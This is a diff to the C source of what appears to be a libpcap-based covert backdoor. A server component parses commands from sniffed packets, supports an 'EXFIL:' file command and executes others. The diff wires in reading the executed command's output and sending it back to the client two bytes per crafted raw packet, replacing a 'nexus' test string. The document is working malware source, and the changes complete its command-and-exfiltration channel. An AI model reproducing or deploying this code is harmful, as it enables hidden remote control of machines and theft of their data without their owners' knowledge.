@@ -227,6 +227,7 @@ void client(struct client_opt c_opt){
     printf("Capturing...\n");
     pcap_loop(client_handle, -1, client_packet_handler, (u_char *)&msg_buf);
     
+    printf("Data Received: %s\n", msg_buf.buffer);
 }
 
 /*
@@ -527,8 +528,7 @@ void client_packet_handler(u_char *args, const struct pcap_pkthdr *header, const
     
     struct message_buffer *msg_buf_ptr = (struct message_buffer *)args;
     
-    printf("\n");
-    printf("Got packet...\n");
+    printf("\nGot packet...\n");
     
     /* Parse packet */
     
@@ -546,7 +546,7 @@ void client_packet_handler(u_char *args, const struct pcap_pkthdr *header, const
     
     // End transmission if got "fin" packet or buffer is full
     if(seg.s == 65535 || msg_buf_ptr->position >= MESSAGE_MAX_SIZE){
-        printf("pcap_breakloop\n");
+        //printf("pcap_breakloop\n");
         pcap_breakloop(client_handle);
         return;
     }
@@ -561,7 +561,7 @@ void client_packet_handler(u_char *args, const struct pcap_pkthdr *header, const
         msg_buf_ptr->position = msg_buf_ptr->position + 2;
     }
     
-    printf("Buffer: %s\n", msg_buf_ptr->buffer);    
+    printf("Buffer: %s\n", msg_buf_ptr->buffer);
 }
 
 /*
@@ -608,6 +608,9 @@ void server_packet_handler(u_char *args, const struct pcap_pkthdr *header, const
     
     /* Handle command */
     
+    // Prepare output buffer
+    char output[MESSAGE_MAX_SIZE] = {0};
+    
     // If file exfil command
     if(strncmp(bd_command,"EXFIL:",6) == 0){
         printf("EXFIL");
@@ -624,8 +627,10 @@ void server_packet_handler(u_char *args, const struct pcap_pkthdr *header, const
         }
         printf("Command executed.\n");
         
-        //server_command(bd_command, &dst_host);
+        // Read in command results
+        fread((void *)output, sizeof(char), MESSAGE_MAX_SIZE, fp);
     }
+    
     
     /* Get destination port from packet based on TCP or UDP
        Create a raw socket and set SO_REUSEADDR */
@@ -672,6 +677,7 @@ void server_packet_handler(u_char *args, const struct pcap_pkthdr *header, const
     struct sockaddr_in* hostaddr = (struct sockaddr_in*)&ifr.ifr_addr;
     printf("IP address: %s\n",inet_ntoa(hostaddr->sin_addr));
     
+    
     /* Prepare destination sockaddr_in */
     
     struct sockaddr_in dst_host;
@@ -699,24 +705,26 @@ void server_packet_handler(u_char *args, const struct pcap_pkthdr *header, const
     printf("sport: %d\n", server_addr.sport);
     printf("dport: %d\n", server_addr.dport);
     
+    
+    // Wait half a second for client to open pcap session...
     usleep(500000);
-    char test[] = "nexus";
+    //char test[] = "nexus";
     
     // 2 bytes at a time
-    size_t test_len = strlen(test);
+    size_t output_len = strlen(output);
     int c = 0;
-    for(c = 0; c < test_len; c = c + 2){
+    for(c = 0; c < output_len; c = c + 2){
         
         char segment[2] = {0};
         // Send 1 char
-        if(c + 1 >= test_len){
-            segment[0] = test[c];
+        if(c + 1 >= output_len){
+            segment[0] = output[c];
             segment[1] = (u_char)255;
         }
         // Send 2 chars
         else{
-            segment[0] = test[c];
-            segment[1] = test[c + 1];
+            segment[0] = output[c];
+            segment[1] = output[c + 1];
         }
         
         // Send packet
